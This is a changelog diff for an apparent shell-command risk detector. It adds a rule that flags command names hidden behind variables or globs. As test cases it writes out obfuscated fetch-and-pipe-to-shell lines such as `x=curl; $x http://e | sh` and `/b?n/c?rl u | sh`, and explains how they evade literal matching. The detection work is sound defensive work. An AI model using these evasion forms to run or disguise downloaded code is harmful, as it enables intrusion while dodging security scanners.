@@ -2,6 +2,36 @@
 
 All notable changes to HLSE Core (C reference) follow [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 
+## Cycle 498 — Dynamic-command cradle (P12e): variable/glob exec names
+
+### Added
+- `dynamic_exec_token()` helper: flags a command whose *name* is
+  produced at runtime — shell `$VAR`/`${VAR}` (any position, since
+  `curl $U | sh` is equally opaque), cmd `%VAR%`, and glob
+  characters `?` `*` `[` in command position (start / after `;` `&`
+  `|` `(` `\n` `` ` ``).  `$(` and positional/special params
+  (`$@`, `$$`) are deliberately excluded: `$(` is already decoded by
+  the literal needles inside it, and `$@` is an ordinary argument.
+- New P12e arm (+45, PASTE_EVAL_FETCH family): a dynamic token AND
+  an interpreter pipe (`PASTE_PIPE_SHELLS`/`PASTE_PIPE_INTERP`) or
+  an exec chain (`PASTE_EXEC_CHAINS`/`chain_runs_executable`).
+
+### Why
+`x=curl; $x http://e | sh`, `%x% u | sh`, `/b?n/c?rl u | sh`,
+`[c]url u | sh` all scored 0 — every literal needle needs a literal
+name.  This closes the last unhandled command-shape evasion class
+that does not require multi-pass evaluation (true variable
+*resolution* is out of scope; the variable *shape* is what flags).
+
+### Verified benign-by-design (probed, unchanged)
+`echo $HOME`, `echo $x | grep y`, `x=y;$x --help`, `rm *.c`,
+`cat file?.txt`, `make $@`, `echo $(date) | x`,
+`type %APPDATA%\x.ini`, `for f in *.sh; do sh $f; done` — all 0.
+`eval "$(ssh-agent)"` keeps its pre-existing P12=45 (eval+`$(`).
+`echo $PAYLOAD | sh` compounds to 90 (P12d+P12e), `%x% &&` to 85 —
+intended additive semantics for stacked evasion.
+
+
 ## Cycle 497 — Shell-escape obfuscation normalization + runas priv-esc
 
 ### Changed
